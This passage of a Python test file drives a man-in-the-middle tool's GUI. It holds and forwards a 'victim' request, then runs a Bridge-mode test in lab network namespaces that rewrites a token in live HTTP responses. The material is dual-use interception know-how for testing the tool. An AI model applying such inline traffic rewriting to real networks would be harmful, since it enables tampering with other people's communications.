            # operator: the request is held; it shows in the panel; release it
            held = False
            for _ in range(40):
                win.intercept_panel.refresh_pending()
                if win.intercept_panel.table.rowCount() > 0:
                    win.intercept_panel.table.selectRow(0)
                    win.intercept_panel._on_select()
                    win.intercept_panel._resolve("forward")
                    held = True
                    break
                time.sleep(0.2)
            assert held, "the victim's request was never held in the Intercept panel"

            t.join(timeout=8)
            assert "HELD-THEN-RELEASED" in result.get("out", ""), \
                f"released request never reached the server: {result!r}"
        finally:
            if win is not None:
                win._stop_inline()
            if mitm is not None:
                mitm.stop()
            if server is not None:
                server.terminate(); server.wait(timeout=3)


def test_gui_bridge_mode_rewrites_a_real_flow():
    """Drive the GUI's Bridge-mode wiring end to end: MainWindow.start_bridge
    builds the engine + intercept, starts a UserspaceBridge on two interfaces via
    _start_service, and the drain loop fills the capture table. A real TCP flow
    through it is rewritten inline and the capture table shows the frames."""
    import tempfile

    from PySide6.QtWidgets import QApplication

    from reforge.testlab.netlab import BridgeFlowLab

    app = QApplication.instance() or QApplication([])
    assert app is not None
    docroot = tempfile.mkdtemp(prefix="rf-guibr-")
    with open(os.path.join(docroot, "page.html"), "w") as fh:
        fh.write("BANNER=ORIGINAL-TOKEN\n")     # same length as the replacement

    server = win = None
    with BridgeFlowLab() as lab:
        try:
            server = subprocess.Popen(
                ["ip", "netns", "exec", lab["server_ns"], "python3", "-m", "http.server",
                 "8000", "--bind", lab["server_ip"]],
                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.0)

            from reforge.gui.main_window import MainWindow
            win = MainWindow()
            win.rules_panel.specs.append({
                "name": "inject", "enabled": True, "match": {"type": "all"},
                "actions": [{"type": "payload_replace",
                             "find": "ORIGINAL-TOKEN", "replace": "INJECTED-TOKEN"}],
            })
            win.act_arm.setChecked(True)                    # arm so the rule applies
            win.mode_combo.setCurrentText("Bridge")
            for combo, iface in ((win.iface_combo, lab["port_a"]), (win.peer_combo, lab["port_b"])):
                combo.addItem(iface); combo.setCurrentText(iface)
            win.start_bridge()
            assert win.service is not None, "bridge service did not start"
            time.sleep(0.5)

            result: dict = {}

            def do_curl():
                r = netns_exec(lab["client_ns"], "curl", "-s", "-m", "8",
                               f"http://{lab['server_ip']}:8000/page.html", check=False)
                result["out"] = r.stdout

            t = threading.Thread(target=do_curl, daemon=True); t.start()
            # pump the GUI drain loop while the flow runs
            for _ in range(80):
                win._drain()
                if result.get("out"):
                    break
                time.sleep(0.1)
            t.join(timeout=5)

            assert "INJECTED-TOKEN" in result.get("out", ""), \
                f"GUI bridge did not rewrite: {result!r}"
            assert win.table.rowCount() > 0, "capture table never filled from the bridge tap"
            assert win.service.counters.modified >= 1
        finally:
            if win is not None:
                win.stop_capture()
            if server is not None:
                server.terminate(); server.wait(timeout=3)
